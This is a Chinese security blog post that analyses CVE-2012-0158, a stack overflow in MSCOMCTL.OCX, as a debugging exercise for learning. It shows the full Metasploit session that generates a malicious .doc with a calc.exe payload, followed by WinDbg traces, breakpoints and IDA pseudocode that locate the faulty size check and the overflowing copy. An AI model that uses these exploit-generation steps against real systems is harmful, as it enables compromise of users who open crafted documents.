<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>漏洞调试-栈溢出漏洞-cve-2012-0158 | Lyon&#39;s blog</title>
  <meta name="author" content="Lyon">
  
  <meta name="description" content="Walk steps step by step">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="漏洞调试-栈溢出漏洞-cve-2012-0158"/>
  <meta property="og:site_name" content="Lyon&#39;s blog"/>

  
    <meta property="og:image" content="undefined"/>
  

  #<link href="/favicon.ico" rel="icon">
  <link rel="icon" type="image/x-icon" href="/favicon.ico">
  <link rel="alternate" href="/atom.xml" title="Lyon&#39;s blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="/js/jquery.min.js"></script>
  <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?1d807422614f63c8de98cdc3b546860c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
  <script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>
    
</head>


<body>
  <!--[if lte IE 8]> <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'> <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode"><img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0027_Simplified Chinese.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." style='margin-left:auto;margin-right:auto;display: block;'/></a></div> <![endif]-->
  <header id="header" class="inner"><div class="alignleft">
  <h1><a href="/">Lyon&#39;s blog</a></h1>
  <h2><a href="/">I hear and I forget.I see and I remember.I do and I understand.</a></h2>
</div>
<nav id="main-nav" class="alignright">
  <ul>
    
      <li><a href="/">首页</a></li>
    
      <li><a href="/archives">归档</a></li>
    
      <li><a href="/about">关于</a></li>
    
	<li> <a href="/atom.xml">RSS</a> </li>
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div></header>
  <div id="content" class="inner">
    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <time datetime="2016-05-23T09:55:21.000Z"><a href="/2016/05/23/Debug/debug-vulner-stackoverflows-2012-0158/">2016-05-23</a></time>
      
      
  
    <h1 class="title">漏洞调试-栈溢出漏洞-cve-2012-0158</h1>
  

    </header>
	
<!-- Table of Contents -->

  <div id="toc" class="toc-article">
  <strong class="toc-title">文章目录</strong>
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit漏洞利用脚本"><span class="toc-number">1.</span> <span class="toc-text">Metasploit漏洞利用脚本</span></a></li></ol>
  </div>


	
    <div class="entry">
      
        <p>##实验环境<br>操作系统：Windows 7（7600）、office 2007（12.0.4518.1014）<br>辅助环境: MetaSploit、Windbg、ida pro</p>
<p>##前言<br>这个漏洞很老，但是很好用，经常看到有利用的文章，之前也没有认真分析过系统漏洞相关的东西（ps 主要是找工作的时候被问漏洞相关的时候自己基本答不上来），所以花上2天时间分析研究下。<br>网上关于这个漏洞分析的文章比较多，主要看了<a href="http://bbs.pediy.com/showthread.php?t=149957" target="_blank" rel="external">看雪</a>的那篇分析文章，发现就是一个由于程序员疏忽小于写成大于造成的栈溢出漏洞，比较经典典型。</p>
<p>##漏洞调试</p>
<a id="more"></a>
<p>###漏洞利用生成<br>看雪提供的利用样本是针对xp系统office2003的，手里没有环境，想了下手里有台BackBox上有msf，就直接用msf生成漏洞利用样本了，步骤如下。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">backbox@backbox-B85M-D3V:~$ sudo msfconsole</span><br><span class="line"></span><br><span class="line">msf &gt; search 2012-0158</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                              Disclosure Date  Rank     Description</span><br><span class="line">   ----                                              ---------------  ----     -----------</span><br><span class="line">   exploit/windows/fileformat/ms12_027_mscomctl_bof  2012-04-10       average  MS12-027 MSCOMCTL ActiveX Buffer Overflow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/fileformat/ms12_027_mscomctl_bof</span><br><span class="line">msf exploit(ms12_027_mscomctl_bof) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: MS12-027 MSCOMCTL ActiveX Buffer Overflow</span><br><span class="line">     Module: exploit/windows/fileformat/ms12_027_mscomctl_bof</span><br><span class="line">   Platform: Windows</span><br><span class="line"> Privileged: No</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Average</span><br><span class="line">  Disclosed: 2012-04-10</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Unknown</span><br><span class="line">  juan vazquez &lt;juan.vazquez@metasploit.com&gt;</span><br><span class="line">  sinn3r &lt;sinn3r@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] English</span><br><span class="line">  1   Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] English</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  FILENAME  msf.doc          yes       The file name.</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 900</span><br><span class="line">  Avoid: 1 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a stack buffer overflow in MSCOMCTL.OCX. It </span><br><span class="line">  uses a malicious RTF to embed the specially crafted </span><br><span class="line">  MSComctlLib.ListViewCtrl.2 Control as exploited in the wild on April </span><br><span class="line">  2012. This module targets Office 2007 and Office 2010 targets. The </span><br><span class="line">  DEP/ASLR bypass on Office 2010 is done with the Ikazuchi ROP chain </span><br><span class="line">  proposed by Abysssec. This chain uses "msgr3en.dll", which will load </span><br><span class="line">  after office got load, so the malicious file must be loaded through </span><br><span class="line">  "File / Open" to achieve exploitation.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  http://cvedetails.com/cve/2012-0158/</span><br><span class="line">  http://www.osvdb.org/81125</span><br><span class="line">  http://www.securityfocus.com/bid/52911</span><br><span class="line">  http://technet.microsoft.com/en-us/security/bulletin/MS12-027</span><br><span class="line">  http://contagiodump.blogspot.com.es/2012/04/cve2012-0158-south-china-sea-inside</span><br><span class="line"></span><br><span class="line">  msf exploit(ms12_027_mscomctl_bof) &gt; show payloads</span><br><span class="line"></span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   Name                                                Disclosure Date  Rank    Description</span><br><span class="line">   ----                                                ---------------  ----    -----------</span><br><span class="line">   generic/custom                                                       normal  Custom Payload</span><br><span class="line">   generic/debug_trap                                                   normal  G</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">msf exploit(ms12_027_mscomctl_bof) &gt; set PAYLOAD windows/exec</span><br><span class="line">PAYLOAD =&gt; windows/exec</span><br><span class="line">msf exploit(ms12_027_mscomctl_bof) &gt; set CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(ms12_027_mscomctl_bof) &gt; set filename 2012_0158.doc</span><br><span class="line">filename =&gt; 2012_0158.doc</span><br><span class="line">msf exploit(ms12_027_mscomctl_bof) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Creating '2012_0158.doc' file ...</span><br><span class="line">[+] 2012_0158.doc stored at /home/backbox/.msf4/local/2012_0158.doc</span><br></pre></td></tr></table></figure>
<p>在Win7+office2007下可用，利用成功后直接弹出计算器。</p>
<p>##分析<br>这里分析的主要目标是找到漏洞触发点及shellcode从那里开始的，怎么开始、执行的，所以就开始动手吧。</p>
<div align="center"><br><img src="/img/20160530winexec.png" alt="ProcMon创建calc进程堆栈" align="center"><br></div>

<p>1.首先打开office，然后Windbg附加，用Process Monitor监控查看创建calc进程堆栈(<a href="http://www.youngroe.com/2016/03/17/Tools/Process-Monitor">堆栈溯源</a>)，发现创建进程为winexec，下断点bu kernel32!winexec，执行后在office中打开样本文件然后等一会直接断下，kv堆栈调用如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="number">00229770</span> <span class="number">0022</span>a6f6 <span class="number">0022</span>a715 <span class="number">00000001</span> <span class="number">00000000</span> kernel32!WinExec+<span class="number">0xb</span> (FPO: [<span class="number">2</span>,<span class="number">32</span>,<span class="number">0</span>])</span><br><span class="line">WARNING: Frame IP not in any known module. Following frames may be wrong.</span><br><span class="line"><span class="number">0022</span>a663 <span class="number">508</span>b64c0 <span class="number">0</span>c528b30 <span class="number">8</span>b14528b b70f2872 <span class="number">0x22a6f6</span></span><br><span class="line"><span class="number">0022</span>a667 <span class="number">0</span>c528b30 <span class="number">8</span>b14528b b70f2872 ff31264a <span class="number">0x508b64c0</span></span><br><span class="line"><span class="number">0022</span>a66b <span class="number">8</span>b14528b b70f2872 ff31264a <span class="number">7</span>c613cac <span class="number">0xc528b30</span></span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; da <span class="number">0022</span>a715 </span><br><span class="line"><span class="number">0022</span>a715  <span class="string">"calc.exe"</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; !address <span class="number">0022</span>a6f6 </span><br><span class="line"> ProcessParametrs <span class="number">002713</span>b0 in range <span class="number">00270000</span> <span class="number">00370000</span></span><br><span class="line"> Environment <span class="number">04390268</span> in range <span class="number">04388000</span> <span class="number">043</span>a0000</span><br><span class="line">    <span class="number">00140000</span> : <span class="number">00216000</span> - <span class="number">0002</span>a000</span><br><span class="line">                    Type     <span class="number">00020000</span> MEM_PRIVATE</span><br><span class="line">                    Protect  <span class="number">00000004</span> PAGE_READWRITE</span><br><span class="line">                    State    <span class="number">00001000</span> MEM_COMMIT</span><br><span class="line">                    Usage    RegionUsageStack</span><br><span class="line">                    Pid.Tid  dfc<span class="number">.81</span>c</span><br></pre></td></tr></table></figure></p>
<p>可以看到Winexec的返回地址为0022a6f6，查看该地址属性发现的确是栈地址空间，发现了一部分shellcode，但是哪里才是shellcode的起始地址呢?<code>翻了该地址前后也没看出什么规律来，想了下如果有一种断点能够在程序执行到栈地址的时候马上断下来就好了，网上搜索了一下没发现这种断点。</code></p>
<p>突然灵光一现，Win7不是有DEP功能么，用Process Explorer查看word进程的进程属性发现DEP标志，不过和其他的服务有点不一样其他的是DEP(permanent)，查了下发现word应该是支持DEP但是没有启用，也没找到启用的方法，直接启用系统的DEP试试，bcdedit.exe/set {current} nx AlwaysOn pause，重启果然再次word打开样本文件，果然程序崩溃了。</p>
<p>2.继续windbg附加调试word，打开样本后F5直接断下来了（看来这个生成的样本没有DEP绕过功能啊）</p>
<div align="center"><br><img src="/img/20160530DEP_enable1.png" alt="DEP开启后调试情况" align="center"><br></div><br>从这里及样本文件中16进制搜索可以确定shellcode的起始地址及栈溢出跳板地址0x27583c30,怎么才能找到程序漏洞的大概地址呢？kv查看函数调用发现栈已经被弄得七荤八素了，esp下翻翻是没有被溢出覆盖的数据，发现了一个可能的漏洞代码附近地址0x275c8a0a，并且查看该地址属于MSOMCTL模块范围内（后面想到也可以对0x27583c30所在的栈地址下内存写入断点，断下来的位置就是漏洞代码处）。<br><div align="center"><br><img src="/img/20160530DEP_enable2.png" alt="发现一个可能的漏洞代码附加地址" align="center"><br></div><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u <span class="number">275</span>c8a0a </span><br><span class="line">MSCOMCTL!DllGetClassObject+<span class="number">0x41cc6</span>:</span><br><span class="line"><span class="number">275</span>c8a0a <span class="number">8</span>bf0            mov     esi,eax</span><br><span class="line"><span class="number">275</span>c8a0c <span class="number">83</span>c40c          add     esp,<span class="number">0</span>Ch</span><br><span class="line"><span class="number">275</span>c8a0f <span class="number">85f</span>6            test    esi,esi</span><br><span class="line"><span class="number">275</span>c8a11 <span class="number">7</span>c3d            jl      MSCOMCTL!DllGetClassObject+<span class="number">0x41d0c</span> (<span class="number">275</span>c8a50)</span><br><span class="line"><span class="number">275</span>c8a13 <span class="number">837</span>df800        cmp     dword ptr [ebp-<span class="number">8</span>],<span class="number">0</span></span><br><span class="line"><span class="number">275</span>c8a17 <span class="number">8</span>b7d08          mov     edi,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">275</span>c8a1a <span class="number">742</span>a            je      MSCOMCTL!DllGetClassObject+<span class="number">0x41d02</span> (<span class="number">275</span>c8a46)</span><br><span class="line"><span class="number">275</span>c8a1c <span class="number">83650</span>c00        and     dword ptr [ebp+<span class="number">0</span>Ch],<span class="number">0</span></span><br><span class="line"></span><br><span class="line">；转到汇编窗口直接查看该地址附加代码</span><br><span class="line"><span class="number">275</span>c89f7 <span class="number">0f</span>8288a60000    jb      MSCOMCTL!DllGetClassObject+<span class="number">0x4c341</span> (<span class="number">275</span>d3085)</span><br><span class="line"><span class="number">275</span>c89fd ff75f4          push    dword ptr [ebp-<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">275</span>c8a00 <span class="number">8</span>d45f8          lea     eax,[ebp-<span class="number">8</span>]</span><br><span class="line"><span class="number">275</span>c8a03 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">275</span>c8a04 <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">275</span>c8a05 e863fdffff      call    MSCOMCTL!DllGetClassObject+<span class="number">0x41a29</span> (<span class="number">275</span>c876d)</span><br><span class="line"><span class="number">275</span>c8a0a <span class="number">8</span>bf0            mov     esi,eax     ;漏洞附近地址</span><br><span class="line"><span class="number">275</span>c8a0c <span class="number">83</span>c40c          add     esp,<span class="number">0</span>Ch</span><br><span class="line"><span class="number">275</span>c8a0f <span class="number">85f</span>6            test    esi,esi</span><br><span class="line"><span class="number">275</span>c8a11 <span class="number">7</span>c3d            jl      MSCOMCTL!DllGetClassObject+<span class="number">0x41d0c</span> (<span class="number">275</span>c8a50)</span><br><span class="line"><span class="number">275</span>c8a13 <span class="number">837</span>df800        cmp     dword ptr [ebp-<span class="number">8</span>],<span class="number">0</span></span><br><span class="line"><span class="number">275</span>c8a17 <span class="number">8</span>b7d08          mov     edi,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">275</span>c8a1a <span class="number">742</span>a            je      MSCOMCTL!DllGetClassObject+<span class="number">0x41d02</span> (<span class="number">275</span>c8a46)</span><br><span class="line"><span class="number">275</span>c8a1c <span class="number">83650</span>c00        and     dword ptr [ebp+<span class="number">0</span>Ch],<span class="number">0</span></span><br></pre></td></tr></table></figure><br><br>可以看到在地址275c8a0处调用MSCOMCTL!DllGetClassObject+0x41a29 (275c876d)函数后会导致栈溢出发生。<br><br>3.上ida，查看地址0x275c8a0a(Windows中大部分系统模块都有默认加载基地址，所以这里ida中的地址和内存中相同)的函数代码<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">int __stdcall sub_275C89C7(int a1, BSTR bstrString)</span><br><span class="line">&#123;</span><br><span class="line">  BSTR v2; // ebx@1</span><br><span class="line">  int result; // eax@1</span><br><span class="line">  int v4; // esi@4</span><br><span class="line">  int v5; // [sp+Ch] [bp-14h]@1</span><br><span class="line">  SIZE_T dwBytes; // [sp+14h] [bp-Ch]@3</span><br><span class="line">  int v7; // [sp+18h] [bp-8h]@4</span><br><span class="line">  int v8; // [sp+1Ch] [bp-4h]@8</span><br><span class="line"></span><br><span class="line">  v2 = bstrString;</span><br><span class="line">  result = sub_275C876D((int)&amp;v5, bstrString, 0xCu);</span><br><span class="line">  if ( result &gt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v5 == 'jboC' &amp;&amp; dwBytes &gt;= 8 )         // 这里应该是&lt;=8  判断条件导致漏洞</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_275C876D((int)&amp;v7, v2, dwBytes); // 0x275c8a0a 这里的复制操作直接导致栈溢出</span><br><span class="line">      if ( v4 &gt;= 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( !v7 )</span><br><span class="line">          goto LABEL_8;</span><br><span class="line">        bstrString = 0;</span><br><span class="line">        v4 = sub_275C8A59((UINT)&amp;bstrString, (int)v2);</span><br><span class="line">        if ( v4 &gt;= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_27585BE7(bstrString);</span><br><span class="line">          SysFreeString(bstrString);</span><br><span class="line">LABEL_8:</span><br><span class="line">          if ( v8 )</span><br><span class="line">            v4 = sub_275C8B2B(a1 + 20, v2);</span><br><span class="line">          return v4;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      return v4;</span><br><span class="line">    &#125;</span><br><span class="line">    result = -2147418113;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//导致溢出的函数</span><br><span class="line">int __cdecl sub_275C876D(int a1, LPVOID lpMem, SIZE_T dwBytes)</span><br><span class="line">&#123;</span><br><span class="line">  LPVOID v3; // ebx@1</span><br><span class="line">  int result; // eax@1</span><br><span class="line">  LPVOID v5; // eax@3</span><br><span class="line">  int v6; // esi@4</span><br><span class="line">  int v7; // [sp+Ch] [bp-4h]@1</span><br><span class="line">  const void *lpMema; // [sp+1Ch] [bp+Ch]@3</span><br><span class="line"></span><br><span class="line">  v3 = lpMem;</span><br><span class="line">  result = (*(int (__stdcall **)(LPVOID, int *, signed int, _DWORD))(*(_DWORD *)lpMem + 12))(lpMem, &amp;v7, 4, 0);</span><br><span class="line">  if ( result &gt;= 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v7 == dwBytes )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = HeapAlloc(hHeap, 0, dwBytes);</span><br><span class="line">      lpMema = v5;</span><br><span class="line">      if ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (*(int (__stdcall **)(LPVOID, LPVOID, SIZE_T, _DWORD))(*(_DWORD *)v3 + 12))(v3, v5, dwBytes, 0);</span><br><span class="line">        if ( v6 &gt;= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          qmemcpy((void *)a1, lpMema, dwBytes); // 导致溢出的地方</span><br><span class="line">          v6 = (*(int (__stdcall **)(LPVOID, void *, SIZE_T, _DWORD))(*(_DWORD *)v3 + 12))(</span><br><span class="line">                 v3,</span><br><span class="line">                 &amp;unk_27632368,</span><br><span class="line">                 ((dwBytes + 3) &amp; 0xFFFFFFFC) - dwBytes,</span><br><span class="line">                 0);</span><br><span class="line">        &#125;</span><br><span class="line">        HeapFree(hHeap, 0, (LPVOID)lpMema);</span><br><span class="line">        result = v6;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        result = -2147024882;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result = -2147418113;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>通过ida f5出来的伪代码基本就可以确定漏洞发生的整个过程，sub_275C89C7中调用sub_275C876D函数向栈缓冲去复制数据但是没有考虑栈空间的大小导致溢出，栈空间大小最大就0xC。<br><br>4.Windbg动态调试验证<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//断点情况</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bl</span><br><span class="line"> <span class="number">0</span> e <span class="number">7584e5</span>fd     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** kernel32!WinExec</span><br><span class="line"> <span class="number">1</span> e <span class="number">27586</span>d44     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** MSCOMCTL!DllGetClassObject</span><br><span class="line"> <span class="number">2</span> e <span class="number">275</span>c89fd     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** MSCOMCTL!DllGetClassObject+<span class="number">0x41cb9</span> <span class="string">".echo 调用sub_275C876D((int)&amp;v7, v2, dwBytes) 复制导致栈溢出的地方"</span></span><br><span class="line"> <span class="number">3</span> e <span class="number">275</span>c87cb     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** MSCOMCTL!DllGetClassObject+<span class="number">0x41a87</span> <span class="string">".echo qmemcpy((void *)a1, lpMema, dwBytes)  直接溢出的地方"</span></span><br><span class="line"> <span class="number">4</span> e <span class="number">275</span>c8a0a     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** MSCOMCTL!DllGetClassObject+<span class="number">0x41cc6</span> <span class="string">".echo 溢出的函数然后的返回地址1"</span></span><br><span class="line"> <span class="number">5</span> e <span class="number">27583</span>c30 e <span class="number">1</span> <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** MSCOMCTL!DllCanUnloadNow+<span class="number">0xc7d</span> <span class="string">".echo 栈溢出跳板指令"</span></span><br><span class="line"><span class="comment">//进入sub_275C876D函数后调用堆栈情况</span></span><br><span class="line"><span class="number">0030</span>a3e4 <span class="number">275</span>c8a0a <span class="number">0030</span>a410 <span class="number">0</span>aaf08e8 <span class="number">00008282</span> MSCOMCTL!DllGetClassObject+<span class="number">0x41a29</span></span><br><span class="line"><span class="number">0030</span>a418 <span class="number">275e701</span>a <span class="number">071</span>b9644 <span class="number">0</span>aaf08e8 <span class="number">00000000</span> MSCOMCTL!DllGetClassObject+<span class="number">0x41cc6</span></span><br><span class="line"><span class="number">0030</span>a440 <span class="number">275e7361</span> <span class="number">071</span>b9644 <span class="number">0</span>aaf08e8 <span class="number">0</span>aaf08e8 MSCOMCTL!DLLGetDocumentation+<span class="number">0xd08</span></span><br><span class="line"><span class="number">0030</span>a460 <span class="number">275</span>ca8b6 <span class="number">0712</span>eea8 <span class="number">0</span>aaf08e8 <span class="number">0712</span>ed00 MSCOMCTL!DLLGetDocumentation+<span class="number">0x104f</span></span><br><span class="line"><span class="number">0030</span>a4e0 <span class="number">2758</span>aee8 <span class="number">0712</span>ecb0 <span class="number">00000000</span> <span class="number">0</span>aaf08e8 MSCOMCTL!DllGetClassObject+<span class="number">0x43b72</span></span><br><span class="line"><span class="number">0030</span>a510 <span class="number">27600908</span> <span class="number">0712</span>ed00 <span class="number">0</span>aaf08e8 <span class="number">00000000</span> MSCOMCTL!DllGetClassObject+<span class="number">0x41a4</span></span><br><span class="line"><span class="comment">//     栈地址0030a410    0aaf08e8   大小 00008282</span></span><br><span class="line">sub_275C876D((<span class="keyword">int</span>)&amp;v7,     v2,            dwBytes)</span><br></pre></td></tr></table></figure><br><br><div align="center"><br><img src="/img/20160530BeforeOverflow.png" alt="栈溢出前的堆栈情况" align="center"><br></div>

<div align="center"><br><img src="/img/20160530AfteroverflowOverflow.png" alt="栈溢出后的堆栈情况" align="center"><br></div>

